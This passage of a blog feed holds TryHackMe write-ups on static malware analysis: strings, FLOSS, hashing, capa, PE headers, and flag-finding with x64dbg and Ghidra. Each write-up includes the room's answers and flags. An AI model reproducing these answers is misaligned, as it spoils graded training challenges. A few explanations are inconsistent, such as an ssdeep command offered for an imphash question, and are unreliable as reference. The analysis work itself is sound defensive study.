$('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">shell32.dll</code></em></p> <p><strong>Using capa, how many anti-VM instructions were identified in malbuster_1?</strong></p> <p>Using <code class="language-plaintext highlighter-rouge">capa Samples/malbuster_1</code>:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/BJxl963MA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="capa malbuster_1" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Capa was not able to retrieve how many anti-VM instructions.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">3</code></em></p> <p><strong>Using capa, which binary can log keystrokes?</strong></p> <p>After testing each sample, this is what we get on <em>malbuster_3</em>:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/BJRd5pnz0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="capa malbuster_3" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">malbuster_3</code></em></p> <p><strong>Using capa, what is the MITRE ID of the DISCOVERY technique used by malbuster_4?</strong></p> <p>This is what we get after using capa on the <em>malbuster_4</em> sample:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/SJkfjThGC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="capa malbuster_4" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">T1083</code></em></p> <p><strong>Which binary contains the string GodMode?</strong></p> <p>By testing each sample with <code class="language-plaintext highlighter-rouge">strings -f malbuster_* | grep GodMode</code>, we can retrieve in which binary this string is present:</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/B1Vh363fC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="string GodMode" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">malbuster_2</code></em></p> <p><strong>Which binary contains the string Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)?</strong></p> <p>We use the same process as before but here we use <em>Mozilla</em> as the keyword.</p> <figure> <picture> <img src="/assets/img/images/thm_ctf_malbuster/ByhUTanzC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="string Mozilla" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">malbuster_1</code></em></p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="CTF"/><category term="Malware Analysis"/><category term="RE"/><category term="Static Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Basic Static Analysis</title><link href="https://nonohm.github.io/blog/2024/THM-Basic-Static-Analysis/" rel="alternate" type="text/html" title="THM Basic Static Analysis"/><published>2024-05-01T20:32:29+00:00</published><updated>2024-05-01T20:32:29+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Basic-Static-Analysis</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Basic-Static-Analysis/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <h3 id="learning-objectives">Learning Objectives</h3> <p>The first step in analyzing malware is generally to look at its properties without running it by doing static analysis. Here, we will cover the following topics:</p> <ul> <li>Lab setup for malware analysis</li> <li>Searching for strings in a malware</li> <li>Fingerprinting malware through hashes</li> <li>Signature-based detection mechanisms</li> <li>Extracting useful information from the PE header</li> </ul> <h2 id="task-2---lab-setup">Task 2 - Lab Setup</h2> <p>Because by analyzing malware is risky and often destructive, we must set a proper environment before it damages our envrionment. Therefore, we need to create a lab setup to analyze them.</p> <p>To make it alive, we are using here Virtual Machines because of its ability to save the state of the machine and revert as well as its flexibility. VMs are created using <a href="https://www.virtualbox.org/">Oracle VirtualBox</a> or <a href="https://www.vmware.com/products/workstation-pro.html">VMWare Workstation</a>.</p> <p>Two distributions are mainly used to make Reverse Engineering, <a href="https://github.com/mandiant/flare-vm?tab=readme-ov-file">FLARE VM</a> and <a href="https://docs.remnux.org/install-distro/get-virtual-appliance">REMnux</a>. FLARE VM is a Windows Based VM, but it is given as a toolkit script and REMnux is a Linux based malware analysis distro.</p> <h2 id="task-3---string-search">Task 3 - String search</h2> <p>A string search can provide useful information of a malware by identifying important pieces of strings.</p> <p>String search, regardless of the file type, identifies sequences of ASCII/unicode character followed by a null character. Werever it finds such a sequence, it reports that as a string but many sequences of bytes can fulfill the criteria mentionned above. Many values are not useful and a string search can provide many False Positives like memory addresses, asm instructions… and they should be ignored.</p> <p>Because an analyst has to differentiate strings of interest from garbage ones, the following artefacts can be used as Indicators of Compromise (IOCs):</p> <ul> <li>Windows Functions and APIs for providing possible functionality of the malware</li> <li>IP Addresses, URL or domain like for a C2 server</li> <li>Miscellaneous strings</li> </ul> <h3 id="basic-string-search">Basic String Search</h3> <p>String searches can be made using the <code class="language-plaintext highlighter-rouge">strings</code> utility that comes pre-installed in linux or <code class="language-plaintext highlighter-rouge">strings.exe</code> in the SysInternals Suite for Windows. Several tools like Cyberchef or PEStudio allows us the ability to make string searches and more.</p> <h3 id="obfuscated-strings">Obfuscated strings</h3> <p>Beceause string searches can disrupt malware propagation and infection, malware authors deploy obfuscation techniques to obfuscate key parts of their code. These often make a string search ineffective.</p> <p><a href="https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings">FLOSS</a> for FireEye Labs Obfuscated String Solver can be sometimes useful to deobfuscate and extract strings that would not normally</p> <h3 id="question">Question</h3> <p><strong>On the Desktop in the attached VM, there is a directory named ‘mal’ with malware samples 1 to 6. Use floss to identify obfuscated strings found in the samples named 2, 5, and 6. Which of these samples contains the string ‘DbgView.exe’?</strong></p> <p>By using FLOSS on these samples with the command:</p> <pre><code class="language-cmd">floss --no-static-strings &lt;file&gt;
</code></pre> <p><em>Answer: <code class="language-plaintext highlighter-rouge">6</code></em></p> <h2 id="task-4---fingerprinting-malware">Task 4 - Fingerprinting malware</h2> <p>When analyzing malware, it is often required to identify unique malware and differentiate them from each other. Because file names can be easily canged, hashes are a good option because they create a unique fixed-length indentifier.</p> <p>These functions are the most common used methods to create a file hash. However, the first two are now considered insecure because they can produce the same hash for multiple inputs.</p> <ul> <li>Md5sum</li> <li>Sha1sum</li> <li>Sha256sum</li> </ul> <h3 id="finding-similar-files-using-hashes">Finding Similar files using hashes</h3> <p>We have seen that hashes are unique and even a slight change can modify a hash’s content. Though, some types of hashes can help identify similarities among different files.</p> <p><strong>Imphash</strong></p> <p><a href="https://www.mandiant.com/resources/blog/tracking-malware-import-hashing">Imphash</a> stands for <em>import hash</em> and it is a hash of the function calls/libraries that a malware sample imports and the order in which these libraries are present in the sample. This helps identify samples from the same threat groups of performing similar activities.</p> <p>Imphash of a program can be viewed in PEstudio and similar samples can be identified in <a href="https://bazaar.abuse.ch/browse.php">Malware Bazaar</a>.</p> <p><strong>Fuzzy Hashes/SSDEEP</strong></p> <p>A fuzzy hash is a Context Triggered Piecewise Hash (CTPH). This hash is calculates by dividing a file into pieces and calculating the hashes of the different pieces. This method creates multiple inputs with similar sequences of bytes.</p> <p><code class="language-plaintext highlighter-rouge">ssdeep</code> or CyberChef are utilities that can calculate a file’s fuzzy hash.</p> <pre><code class="language-cmd">ssdeep &lt;file&gt; # Calculate a file's fuzzy hash
ssdeep -l -r -d &lt;directory&gt; # Match files recursively with similar fuzzy hashes 
</code></pre> <h3 id="questions">Questions</h3> <p><strong>In the samples located at <code class="language-plaintext highlighter-rouge">Desktop\mal\</code> directory in the attached VM, which of the samples has the same imphash as file 3?</strong></p> <p>By running <code class="language-plaintext highlighter-rouge">ssdeep -d ../mal/*</code>:</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">1</code></em></p> <p><strong>Using the ssdeep utility, what is the percentage match of the above-mentioned files?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">93</code></em></p> <h2 id="task-5---signature-based-detection">Task 5 - Signature-based detection</h2> <p>We have learnt how hashes could identify identical files and identify file similarities using imphash and ssdeep. Sometimes, we just need to identify if a file contains the information of interesst though.</p> <h3 id="signatures">Signatures</h3> <p>Signatures are a way to idetify a particular type of content because signatures can be considered as a pattern that might be found inside a file. The pattern is often a sequence of bytes in a file, with or without any context.</p> <p><strong>Yara rules</strong></p> <p>Yara rules are a type of signature-based rule. It can identify information based on binary and textual patterns such as hex or strings. However, even if <a href="https://github.com/Yara-Rules/rules">community rules</a> or homebrew rules hits doesn’t mean the file is malicious. It is important to know the properties of the rule.</p> <p><strong>Proprietary Signatures - Antivirus Scans</strong></p> <p>Proprietary signatures have the advantage of having less chances of False Positives (a signature hits a non-malicious file) but this might lead to few False Negatives (a malicious file does not hit any signature).</p> <p>That is why it is important to get a verdict from multiple products like with <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a>. When analyzing a sensitive file, it is important to search hash on Virustotal or importing it on non-reporting scanning service (which Virustotal does not do).</p> <p><strong>Capa</strong></p> <p><a href="https://github.com/mandiant/capa">Capa</a> is an FOSS tool to help identify the capabilities found in a PE file. It reads the file and tries to identifies the behavior based on signatures such as imports, strings, mutexes…</p> <p>Capa identifies and maps capabilities according to the <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> framework and <a href="https://github.com/MBCProject/mbc-markdown">Malware Behavior Catalog</a>.</p> <p>The syntax is the following:</p> <pre><code class="language-cmd">capa &lt;file&gt;
capa -h
</code></pre> <h3 id="questions-1">Questions</h3> <p>Using the file in <code class="language-plaintext highlighter-rouge">Desktop\mal\4</code>:</p> <p><strong>How many matches for anti-VM execution techniques were identified in the sample?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">86</code></em></p> <p><strong>Does the sample have to capability to suspend or resume a thread? Answer with Y for yes and N for no.</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Y</code></em></p> <p><strong>What MBC behavior is observed against the MBC Objective ‘Anti-Static Analysis’?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Disassembler Evasion::Argument Obfuscation [B0012.001]</code></em></p> <p><strong>At what address is the function that has the capability ‘Check HTTP Status Code’?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x486921</code></em></p> <h2 id="task-6---leveraging-the-pe-header">Task 6 - Leveraging the PE header</h2> <p>Because the covered techniques, even though they provide information regardless of the file type of the malware, don’t always provide us deterministic information; PE Heasers provide a more deterministic characteristics of the sample, which tells us more about it.</p> <h3 id="pe-header">PE Header</h3> <p>PE files consist of a sequence of bits stored on the disk in a specific format. The initial bits of the PE file define the characteristics of it and explains us how to read the contained data. This initial part is called the PE Header.</p> <p>PEStudio can help us dissect PE Header.</p> <p><strong>Linked Libraries, imports and functions</strong></p> <p>A PE File does not contain all of its code to perform tasks and reuses code from different liraries. The information about what library (.dll) is imported, is contained in the PE Header and can give us a rough idea of the functionnality of the malware sample.</p> <p><strong>Identifying Packed Executables</strong></p> <p>Static analysis can provide a lot of informatio about the executable, so in order to face this problem, obfuscation is often used to block analysis. One way of doing this is by packing the original sample inside a shell-type code that obfuscates the proerties of the actual malware sample.<br/> Packed executables are identifiable by analyzing ressource sections and entropies.</p> <h3 id="questions-2">Questions</h3> <p><strong>Open the sample Desktop\mal\4 in PEstudio. Which library is blacklisted?</strong></p> <figure> <picture> <img src="/assets/img/images/thm_basic_static_analysis/r1lS4FbzR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="PEStudio Libraries Import" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><em>Answer: <code class="language-plaintext highlighter-rouge">rpcrt4.dll</code></em></p> <p><strong>What does this DLL do?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Remote Procedure Call Runtime</code></em></p> <h2 id="task-7---conclusion">Task 7 - Conclusion</h2> <p>In this room, we have learned about:</p> <ul> <li>Lab setup for malware analysis</li> <li>Searching for strings and obfuscated strings</li> <li>Fingerprinting malware using hashes and identifying similar samples using imphash and ssdeep</li> <li>Using signature-based detection like Yara and Capa</li> <li>Identifying artifacts from the PE header</li> </ul>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="Malware Analysis"/><category term="RE"/><category term="Static Analysis"/><summary type="html"><![CDATA[Task 1 - Introduction]]></summary></entry><entry><title type="html">THM Basic Malware RE</title><link href="https://nonohm.github.io/blog/2024/THM-Basic-Malware-RE/" rel="alternate" type="text/html" title="THM Basic Malware RE"/><published>2024-04-24T17:44:02+00:00</published><updated>2024-04-24T17:44:02+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Basic-Malware-RE</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Basic-Malware-RE/"><![CDATA[<h2 id="task-2---stringschallenge-1">Task 2 - Strings::Challenge 1</h2> <p>After downloading the provided executable, we need to find a certain flag which a md5 hash of it gets generated.</p> <p>We firstly try viewing the executable using <code class="language-plaintext highlighter-rouge">strings strings1.exe_</code>.</p> <pre><code class="language-raw">!This program cannot be run in DOS mode.
Rich
.text
`.rdata
@.data
.CRT
@.rsrc
@.reloc
QZ^&amp;
QXRhl
TAhR
j0hT
FLAG{THE-DEPICTED-THE-IMPORTANT-THE}
FLAG{INCLUDES-COLLECTIVE-AND-SOCIALIST-INQUIRY}
FLAG{LAW-IDEOLOGICAL-INTO-THE-THE}
FLAG{COMPETENCE-ISSUE-PERSONAL-THE-LAW}
FLAG{MATTERS-POLITICAL-DETERMINATION-ITS-SOCIALIST}
FLAG{BODIES-PROMOTE-NATIONWIDE-COLLECTIVE-SOVIET}
...
</code></pre> <p>However, as we can see, there is a plenty of flags available, and finding it would be a hassle.</p> <p>Using x64dbg, we can go to the EntryPoint of the executable, and then find the executable that gets hashed.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_malware_re/rkcQas8-C.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="x64dbg flag hash" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question">Question</h3> <p><strong>What is the flag of which that MD5 gets generated?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">FLAG{CAN-I-MAKE-IT-ANYMORE-OBVIOUS}</code></em></p> <h2 id="task-3---strings--challenge-2">Task 3 - Strings :: Challenge 2</h2> <p>Here, we directly putting our executable in x64dbg. When we reach the entrypoint of our executable, we can directly see each character of the flag that is being pushed into <code class="language-plaintext highlighter-rouge">ebp</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_malware_re/rJlh_q1G0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Flag characters" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question-1">Question</h3> <p><strong>What is the flag of which that MD5 gets generated?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">FLAG{STACK-STRINGS-ARE-BEST-STRINGS}</code></em></p> <h2 id="task-4---strings--challenge-3">Task 4 - Strings :: Challenge 3</h2> <p>In this case, the problem is a bit more complex so we will use ghidra instead of x64dbg.</p> <p>When we look into our program, we can see this:</p> <figure> <picture> <img src="/assets/img/images/thm_basic_malware_re/H1Bt821zC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Decompiled strings 3" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>We can see that we have <code class="language-plaintext highlighter-rouge">FindRessourceA</code> and <code class="language-plaintext highlighter-rouge">LoadStringA</code>.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">LoadStringA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">HINSTANCE</span> <span class="n">hInstance</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">UINT</span>      <span class="n">uID</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span>          <span class="n">LPSTR</span>     <span class="n">lpBuffer</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="kt">int</span>       <span class="n">cchBufferMax</span>
<span class="p">);</span>

<span class="n">HRSRC</span> <span class="nf">FindResourceA</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">LPCSTR</span>  <span class="n">lpName</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">LPCSTR</span>  <span class="n">lpType</span>
<span class="p">);</span>
</code></pre></div></div> <ul> <li><code class="language-plaintext highlighter-rouge">FindResourceA</code>: Searches for a resource in a Windows executable file. Here it searches in this program for “rc.rc” but it doesn’t seem to have a partucal purpose.</li> <li><code class="language-plaintext highlighter-rouge">LoadStringA</code>: Loads a string resource from a Windows executable file into memory. Here, it searches for a string with id 0x110 (272 in decimal) and returns the pointer address of where it has been copied.</li> </ul> <p>Now, our goal is to find a string associated with this ID in the .rsrc string stable.</p> <figure> <picture> <img src="/assets/img/images/thm_basic_malware_re/ryprs3yGC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Ghidra challenge 3 .rsrc" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="question-2">Question</h3> <p><strong>What is the flag of which that MD5 gets generated?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE}</code></em></p>]]></content><author><name>NonoHM</name></author><category term="THM"/><category term="CTF"/><category term="RE"/><category term="Static Analysis"/><summary type="html"><![CDATA[Task 2 - Strings::Challenge 1]]></summary></entry><entry><title type="html">THM Dissecting PE Headers</title><link href="https://nonohm.github.io/blog/2024/THM-Dissecting-PE-Headers/" rel="alternate" type="text/html" title="THM Dissecting PE Headers"/><published>2024-04-23T19:48:06+00:00</published><updated>2024-04-23T19:48:06+00:00</updated><id>https://nonohm.github.io/blog/2024/THM-Dissecting-PE-Headers</id><content type="html" xml:base="https://nonohm.github.io/blog/2024/THM-Dissecting-PE-Headers/"><![CDATA[<h2 id="task-1---introduction">Task 1 - Introduction</h2> <p>In Windows, <code class="language-plaintext highlighter-rouge">.exe</code> files stands for executable files. It contains code that can be executed by the machine. An executable file is also called a portable Executable (PE) file. A PE file is a Common object File Format (COFF) data structure. The COFF consists in Windows of PE files and DLL and in Linux, it is shared objects and ELF files.</p> <h3 id="learning-objectives">Learning Objectives</h3> <p>In this room, we’ll review the following:</p> <ul> <li>Understanding the different headers in a PE file</li> <li>Learning how to read PE headers</li> <li>Identify packed executables</li> <li>Use the information from PE headers to analyze malware</li> </ul> <h2 id="task-2---overview-of-pe-headers">Task 2 - Overview of PE Headers</h2> <p>A PE executable is like other type of data, a combination of bits and when looking into it using an Hex editor, we can see a bunch of random hex chars. These are instructions for Windows to execute the file.</p> <p>In this room, we will use <em>wxHexEditor</em> and <em>pe-tree</em> to visualize better a PE header structure.</p> <p>The most impotrant headers are:</p> <ul> <li>IMAGE_DOS_HEADER</li> <li>IMAGE_NT_HEADERS <ul> <li>FILE_HEADER</li> <li>OPTIONAL_HEADER</li> <li>IMAGE_SECTION_HEADER</li> <li>IMAGE_IMPORT_DESCRIPTOR</li> </ul> </li> </ul> <p>These headers are the data type STRUCT in C, which is a user-defined data type that combines different types of data elements into a single variable. Thus, to understand each header, we need to go through documentation.</p> <h3 id="question">Question</h3> <p><strong>What data type are the PE headers</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">STRUCT</code></em></p> <h2 id="task-3---image_dos_header-and-dos_stub">Task 3 - IMAGE_DOS_HEADER and DOS_STUB</h2> <p>We are using <em>pe-tree</em> with the given sample <em>redline</em>.</p> <h3 id="image_dos_header">IMAGE_DOS_HEADER</h3> <p>The IMAGE_DOS_HEADER consists of the first 64 bytes of the PE file. In <em>pe tree</em>, the values are shown in little endian format; the least significant bytes are shown first (the ones in right).</p> <p>LE: <code class="language-plaintext highlighter-rouge">0x1020304050</code> BE: <code class="language-plaintext highlighter-rouge">Ox5040302010</code></p> <p>The first thing we can understand is <code class="language-plaintext highlighter-rouge">MZ</code>, which stands for Mark Zbikowski (one of the architect of this format), and it is the character identifying the PE format. This signature is also called <code class="language-plaintext highlighter-rouge">e_magic</code> and has a value of <code class="language-plaintext highlighter-rouge">0x5a4d</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/Hy3M6urbR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="IMAGE_DOS_HEADER Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The last value called <code class="language-plaintext highlighter-rouge">e_lfanew</code>, has a value of <code class="language-plaintext highlighter-rouge">0x000000d8</code> and denotes the address where IMAGE_NT_HEADERS start.</p> <h3 id="dos_stub">DOS_STUB</h3> <p>The DOS_STUB is just after the IMAGE_DOS_HEADER and is mainly used to contain the piece of code if the PE file is incompatible with the system.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/SJH_COSZA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="DOS_STUB Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions">Questions</h3> <p><strong>How many bytes are present in the IMAGE_DOS_HEADER?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">64</code></em></p> <p><strong>What does MZ stand for?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Mark Zbikowski</code></em></p> <p><strong>In what variable of the IMAGE_DOS_HEADER is the address of IMAGE_NT_HEADERS saved?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">e_lfanew</code></em></p> <p><strong>In the attached VM, open the PE file Desktop/Samples/zmsuz3pinwl in pe-tree. What is the address of IMAGE_NT_HEADERS for this PE file?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x000000f8</code></em></p> <h2 id="task-4---image_nt_headers">Task 4 - IMAGE_NT_HEADERS</h2> <p>Here, we will focus on the different parts of <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32">IMAGE_NT_HEADERS</a>, containing vital information related to the PE file.</p> <h3 id="nt_headers">NT_HEADERS</h3> <p>NT_HEADERS consist of:</p> <ul> <li>Signature: Contains <code class="language-plaintext highlighter-rouge">PE</code> keyword in ASCII</li> <li>FILE_HEADER</li> <li>OPTIONAL_HEADER</li> </ul> <p>The Signature consists of marking the start of NT_HEADERS.</p> <h3 id="file_header">FILE_HEADER</h3> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/rJy0g9rbC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="FILE_HEADER Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The FILE_HEADER gives some vital information like:</p> <ul> <li><strong>Machine</strong>: Type of architecture the PE file is written. <code class="language-plaintext highlighter-rouge">i386</code> is for 32-bit architecture.</li> <li><strong>NumberOfSections</strong>: A PE file contains section where code, variables and other ressources are stored. It mentions how many the PE file has.</li> <li><strong>TimeDateStamp</strong>: Time and date of binary compilation</li> <li><strong>PointerToSymbolTable and NumberOfSymbols</strong>: Generally not related to PE files and are there due to COFF file headers.</li> <li><strong>SizeOfOptionalHeader</strong>: Size of the optional header</li> <li><strong>Charactristics</strong>: Tells us that the PE file is an executable image, has stripped relocation information, line numbers, and local symbol information.</li> </ul> <p>For characteristics, these means that the executable is not position-independent and must be loaded at a specific base address, the PE file does not contain detailed debugging data and debugging symbols are removed, making it harder to debug or analyze the executable.</p> <p>These are located here in the hex view with the value <code class="language-plaintext highlighter-rouge">0x0f01</code>.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/Sys3NtB-R.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="FILE_HEADER Characteristics Hex location" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="questions-1">Questions</h3> <p><strong>In the attached VM, there is a file Desktop\Samples\zmsuz3pinwl. Open this file in pe-tree. Is this PE file compiled for a 32-bit machine or a 64-bit machine?</strong></p> <p>According to <em>pe-tree</em>, <code class="language-plaintext highlighter-rouge">Machine 0x014c I386</code>.</p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">32-bit machine</code></em></p> <p><strong>What is the TimeDateStamp of this file?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x62289d45 Wed Mar 9 12:27:49 2022 UTC</code></em></p> <h2 id="task-5---optional_header">Task 5 - OPTIONAL_HEADER</h2> <p>The OPTIONAL_HEADER is also a part of the NT_HEADERS and contains some of the most important information.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/HJSnl9SZC.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="OPTIONAL_HEADER Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>The most important fields are:</p> <ul> <li><strong>Magic</strong>: Tells whether the PE file is a 32-bit (<code class="language-plaintext highlighter-rouge">0x010B</code>) or a 64-bit appliaction (<code class="language-plaintext highlighter-rouge">0x020B</code>).</li> <li><strong>AddressOfEntryPoint</strong>: Address where Windows will begin execution. This is an offset relative (RVA - Relative Virtual Address) of the base address contained into ImageBase.</li> <li><strong>BaseOfCode</strong> and <strong>BaseOfData</strong>: Relative addresses of code and data sections.</li> <li><strong>ImageBase</strong>: Preferred loading address of the PE in the memory. Generally, the value is <code class="language-plaintext highlighter-rouge">0x00400000</code> but can sometimes be changed and relative addresses are relocated following the new ImageBase.</li> <li><strong>Subsystem</strong>: Represent a value for Windows Native, GUI, CLI or other ones.</li> <li><strong>DataDirectory</strong>: Contains import and export information of the PE file. These locate the RVA of the needed sections.</li> </ul> <h3 id="questions-2">Questions</h3> <p><strong>Which variable from the OPTIONAL_HEADER indicates whether the file is a 32-bit or a 64-bit application?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">Magic</code></em></p> <p><strong>What Magic value indicates that the file is a 64-bit application?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x020B</code></em></p> <p><strong>What is the subsystem of the file Desktop\Samples\zmsuz3pinwl?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0x0003 WINDOWS_CUI</code></em></p> <h2 id="task-6---image_section_header">Task 6 - IMAGE_SECTION_HEADER</h2> <p>Sections in a PE file contains data like code, icons, images, GUI elements… and information about these are stored into the IMAGE_SECTION_HEADER.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/SJf5lqHZR.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="IMAGE_SECTION_HEADER Structure" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>In this header, we can find different sections named <code class="language-plaintext highlighter-rouge">.text</code>, <code class="language-plaintext highlighter-rouge">.rdata</code>, <code class="language-plaintext highlighter-rouge">.data</code>, <code class="language-plaintext highlighter-rouge">.ndata</code> and <code class="language-plaintext highlighter-rouge">.rsrc</code>.</p> <ul> <li><strong>.text</strong>: Contains the executable code. The Characteristics for this section include <em>CODE</em>, <em>EXECUTE</em> and <em>READ</em>, meaning that this section contains executable code, which can be read but can’t be written to.</li> <li><strong>.data</strong>: Contains initialized data of the application. The Characteristics are <em>READ/WRITE</em>.</li> <li><strong>.rdata/.idata</strong>: Contains import information to import functions or data from other files.</li> <li><strong>.ndata</strong>: Contains uninitialized data.</li> <li><strong>.reloc</strong>: Contains relocation information of the PE.</li> <li><strong>.rsrc</strong>: Contains icons, images or other ressources required for UI.</li> </ul> <p>Into each sections, we can retrieve information like:</p> <ul> <li><strong>VirtualAddress</strong>: Section’s RVA.</li> <li><strong>VirtualSize</strong>: Section’s size once loaded into memory.</li> <li><strong>SizeOfRawData</strong>: Section’s size as stored on the disk before loaded in memory.</li> <li><strong>Characteristics</strong>: Permissions of the section.</li> </ul> <h3 id="questions-3">Questions</h3> <p><strong>How many sections does the file Desktop\Samples\zmsuz3pinwl have?</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">7</code></em></p> <p><strong>What are the characteristics of the .rsrc section of the file Desktop\Samples\zmsuz3pinwl</strong></p> <p><em>Answer: <code class="language-plaintext highlighter-rouge">0xe0000040 INITIALIZED_DATA | EXECUTE | READ | WRITE</code></em></p> <h2 id="task-7---image_import_descriptor">Task 7 - IMAGE_IMPORT_DESCRIPTOR</h2> <p>The IMAGE_IMPORT_DESCRIPTOR structure contains information about the different Windows APIs needed to be loaded when the application in executed.</p> <figure> <picture> <img src="/assets/img/images/thm_dissecting_pe_headers/Hkpkl5SWA.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="IMAGE_IMPORT_DESCRIPTOR pe-tree" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>As we can see, this PE imports functions from <em>ADVAPI32.dll</em>, <em>SHELL32.dll</em>, <em>ole32.dll</em>, <em>COMCTL32.dll</em>, and <em>USER32.dll</em>. <code class="language-plaintext highlighter-rouge">OriginalFirstThunk</code> and <code class="language-plaintext highlighter-rouge">FirstThunk</code> values are used by the OS to build the Import Address Table (IAT) of the PE file.</p> <ul> 